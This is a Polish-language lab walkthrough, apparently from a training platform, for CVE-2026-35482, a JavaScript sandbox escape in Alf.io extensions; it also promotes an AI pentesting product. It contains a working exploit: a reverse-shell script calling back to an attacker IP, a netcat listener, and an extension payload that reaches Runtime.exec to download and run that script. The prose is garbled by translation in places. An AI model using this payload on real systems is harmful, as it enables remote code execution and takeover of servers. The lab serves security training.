---

**[Alf.io(otwiera się w nowej karcie)](http://alf.io/)**to platforma do zarządzania wydarzeniami oparta na technologii Java/Spring Boot, oparta na otwartym kodzie źródłowym, używana przez organizatorów konferencji, kluby sportowe i firmy biletowe na całym świecie. Dostarczana jest z systemem rozszerzeń, który umożliwia administratorom uruchamianie niestandardowych skryptów JavaScript w odpowiedzi na zdarzenia na platformie, takie jak przypisywanie biletów i generowanie faktur.

Aby odizolować te skrypty od podstawowej maszyny wirtualnej Java, Alf.io używa skryptu JavaScriptpiaskownicaWspierane przez Mozilla Rhino. Skrypty są weryfikowane pod kątem listy blokowanych przed wykonaniem, gdzie wzorce takie jak `java.lang.Runtime`słowa kluczowe i refleksyjne są odrzucane. Założenie: skrypt, który nie potrafi nazwać niebezpiecznej klasy, nie może do niej dotrzeć.

**Luka CVE-2026-35482 przeczy temu założeniu.** Została odkryta autonomicznie przez NoScope. NoScope przeprowadził w pełni zautomatyzowany test penetracyjny (pentest) celu, zidentyfikował nietypowe `returnClass`powiązanie, potwierdził, że jest ono podatne na atak end-to-end i wygenerował potwierdzony wynik – wszystko to bez konieczności zaglądania do kodu. Żadne narzędzie do analizy statycznej ani testów penetracyjnych nie wykryło tego wcześniej.

Alf.io wstrzykuje zmienną wywoływaną `returnClass`do zakresu każdego skryptu – surowy `Class<T>`obiekt Java, który ma być ułatwieniem dla skryptów, które muszą deklarować swój typ zwracany. Ponieważ `Class<T>`Alf.io ujawnia `Class.forName()`, atakujący może załadować dowolną klasę JVM, przekazując jej nazwę jako argument w postaci ciągu znaków, którego lista bloków nigdy nie sprawdza. W tym momencie refleksja w Javie zapewnia pełny dostęp do `Runtime.exec()`wykonywania dowolnych poleceń systemu operacyjnego.

NoScope odpowiedzialnie ujawniło lukę w zabezpieczeniach administratorom Alf.io i koordynowało przydzielanie CVE przed publikacją.

## Cele edukacyjne

- Skonfiguruj NoScope i uruchom w pełni zautomatyzowany test penetracyjny na żywym celu
- Potwierdź, że na komputerze docelowym działa podatna na ataki wersja Alf.io
- Dowiedz się, w jaki sposób NoScope autonomicznie zidentyfikował i zweryfikował [lukę CVE-2026-35482(otwiera się w nowej karcie)](https://nvd.nist.gov/vuln/detail/CVE-2026-35482)
- Utwórz ładunek ucieczki z piaskownicy za pomocą `returnClass`powiązania
- Zarejestruj i uruchom ładunek za pomocą rozszerzeńAPI
- Uaktualnij do odwrotnej powłoki

Sztuczna inteligencja Znacznie przyspieszyło ataki. Czas od ujawnienia luki do jej aktywnego wykorzystania skrócił się z lat do miesięcy, dni, a obecnie nawet do godzin. Jednocześnie zespoły inżynierów wysyłają kod kilka razy dziennie, stale zwiększając powierzchnię ataku.

Testy bezpieczeństwa nie nadążały. Kwartalne lub roczne testy penetracyjne miały sens, gdy oprogramowanie było wydawane kwartalnie. Teraz już tak nie jest i tę lukę rozwiązuje NoScope.

## Czym jest NoScope?

[NoScope(otwiera się w nowej karcie)](https://www.noscope.com/)jest Sztuczna inteligencja Zautomatyzowana platforma testów penetracyjnych oparta na technologii pentester. Wdraża wyspecjalizowanych agentów, którzy mapują powierzchnię ataku aplikacji, budują graf ataku, generują ukierunkowane ładunki i potwierdzają podatność na atak od początku do końca, zanim cokolwiek zostanie zidentyfikowane jako wykrycie. Nic nie zostaje oznaczone flagą, dopóki nie zostanie udowodnione.

![O NoScope|697](https://cdn-images.tryhackme.com/user-uploads/691bd5221802481448f54214/room-content/691bd5221802481448f54214-1782357601472.jpg)

## Jak działa NoScope?

![Wyzwalacze pentestu->Agent NoScope->Agent Swam->Validator](https://cdn-images.tryhackme.com/user-uploads/691bd5221802481448f54214/room-content/691bd5221802481448f54214-1782357866497.jpg)

## Wypróbuj to

Uruchom maszynę, klikając przycisk **Uruchom maszynę laboratoryjną** poniżej, a następnie kliknij **Otwórz w NoScope** po Maszyna wirtualna Załadował się i przetestuj `MACHINE_IP`. Uzupełnij kilka szczegółów dotyczących aplikacji, uruchom test penetracyjny i obserwuj, jak agent pracuje nad nim w czasie rzeczywistym. Zobaczysz logi, uzasadnienie i dokładny sposób działania.CVE-2026-35482 został znaleziony autonomicznie.

Alf.IO to platforma open-source do zarządzania wydarzeniami i rezerwacjami biletów, napisana w Java (Spring Boot). Zawiera funkcje rozszerzeń (min-only Extensions), która umożliwia wykonanie niestandardowego kodu JavaScript w odpowiedzi na zdarzenia aplikacji (np. potwierdzenie rezerwacji, zmiana statusu wydarzenia). Skrypty te działają w środowisku testowym JavaScript, aby zapobiec wykonywaniu dowolnego kodu. Celem tego testu jest sprawdzenie, czy środowisko testowe można ominąć, aby umożliwić zdalne wykonywanie kodu.

## Użycie CVE jako broni ##

Referencje

Nazwa użytkownika : administrator

Hasło:  Hasło1!

Połączenie przez

http://10.129.135.175/admin

Zidentyfikowano, że na komputerze docelowym działa  **Alf.io 2.0-M5-2509-1** , wersja podatna na atakiCVE-2026-35482. Uzyskałeś również prawidłowe dane logowania administratora do panelu administracyjnego i zauważyłeś, że wydarzenie zostało już skonfigurowane.

Twoim celem jest wykorzystanie luki w zabezpieczeniach, aby uzyskać odwrotną powłokę na maszynie docelowej.

## Uzyskiwanie odwrotnej powłoki

**Krok 1: Odwrotne przygotowanie muszli**

Uruchom AttackBox, klikając przycisk „ **Start AttackBox”** w Zadaniu 2 lub na górze strony. Następnie w AttackBox otwórz terminal i utwórz rev.sh :

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.129.65.17/4444 0>&1 &
```

Podaj przez HTTP:

```bash
python -m http.server 80
```

W innym terminalu uruchom program nasłuchujący netcat:

```bash
nc -lvnp 4444
```

**Krok 2: Zbuduj ładunek powłoki odwrotnej**

Exploit rejestruje złośliwy skrypt rozszerzenia, który `returnClass.forName()`ładuje się `java.lang.Runtime`według nazwy, całkowicie omijając listę blokowanych plików w piaskownicy.

`Runtime.exec(String)`nie rozszerza metaznaków powłoki, więc pobierzemy nasz odwrotny skrypt powłoki, zmienimy uprawnienia i uruchomimy go.

```javascript
function getScriptMetadata() {
	return {
		id: 'rce-validate',
		displayName: 'RCE Validate',
		version: 0,
		async: false,
		events: ['EVENT_STATUS_CHANGE']
	};
}

function executeScript(scriptEvent) {
	var rtClass = returnClass.forName('java.lang.Runtime');
	var strClass = returnClass.forName('java.lang.String');
	var runtime = rtClass.getMethod('getRuntime').invoke(null);
	var proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'wget http://10.129.65.17/rev.sh -O /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, 'chmod 777 /home/alfio/rev.sh');
	proc = rtClass.getMethod('exec', strClass).invoke(runtime, '/home/alfio/rev.sh');
	var bytes = proc.getInputStream().readAllBytes();

	var output = '';
	for (var i = 0; i < bytes.length; i++) {
		output += String.fromCharCode(bytes[i] & 0xFF);
	}

	console.log(output);
	return { invoiceNumber: output };
}
```

**Krok 3: Zarejestruj rozszerzenie**

Zaloguj się do panelu administracyjnego `http://10.129.135.175/admin`i przejdź do **Rozszerzenie → dodaj nowe** .

![dodaj nowy](https://cdn-images.tryhackme.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1782712006967.png)

Dodaj ścieżkę na górze (np. System/rev), wklej swój ładunek i zapisz rozszerzenie.

**Krok 4: Uruchom rozszerzenie**

Ładunek nasłuchuje `EVENT_STATUS_CHANGE`zdarzeń. Oznacza to, że za każdym razem, gdy zdarzenie zostanie opublikowane lub ukryte, rozszerzenie zostanie uruchomione. Przejdź do sekcji  **„Zdarzenia”** , a następnie kliknij **„Załaduj wygasłe zdarzenia”** , aby uzyskać dostęp do skonfigurowanego zdarzenia  **TryHackMe , i kliknij przycisk „** **Publikuj teraz”**  . To natychmiast uruchomi rozszerzenie.![Opublikuj teraz](https://cdn-images.tryhackme.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1782712006947.png)

Obserwuj swojego słuchacza — odwrotna powłoka powinna nawiązać połączenie w ciągu kilku sekund.

Jeśli popełnisz jakiekolwiek błędy, możesz ponownie uruchomić rozszerzenie, ukrywając wydarzenie. Aby to zrobić, przejdź do sekcji „ **Informacje logistyczne i opis”** , kliknij **„Edytuj”** , zmień **datę wydarzenia** na datę w przyszłości, kliknij **„Zapisz”** i wybierz **„Akcje** → **ukryj na liście”** .

![Ukryj na liście](https://cdn-images.tryhackme.com/user-uploads/6989b1062386d3517f652edd/room-content/6989b1062386d3517f652edd-1782712006929.png)

W tym pokoju prześledziłeś cały łańcuch ataku, od identyfikacji podatności do dostępu do powłoki na rzeczywistym celu. Zrozumiałeś Sandbox, wydostał się z niego i zdobył flagę.

Przy okazji zapoznałeś się również z nowym sposobem myślenia o testowaniu bezpieczeństwa. Zobaczyłeś, jak NoScope autonomicznie podchodzi do celu, jak mapuje powierzchnię ataku, weryfikuje ustalenia i ujawnia potwierdzone luki w zabezpieczeniach. Skonfigurowałeś również wyzwalacze, co oznacza, że ​​NoScope może automatycznie ponownie testować przy każdym wdrożeniu, za każdym razem. CVEU puść, każda zmiana powierzchni. Tak właśnie działa ciągłe testowanie penetracyjne w praktyce, a ty właśnie to skonfigurowałeś.

Teraz wiesz jak:

- Zidentyfikuj Javę piaskownicaucieczka i zrozumienie, dlaczego lista blokowanych nie powiodła się
- Stwórz `returnClass`ładunek i połącz go łańcuchem`Runtime.exec()`
- Zarejestruj i uruchom złośliwe rozszerzenie za pomocą rozszerzeńAPI
- Ulepszenie do odwróconej powłoki Revers shell na prawdziwym celu
- Autonomiczne uruchamianie NoScope w aplikacji na żywo
- Skonfiguruj ciągłe wyzwalacze, aby bezpieczeństwo nadążało za rozwojem
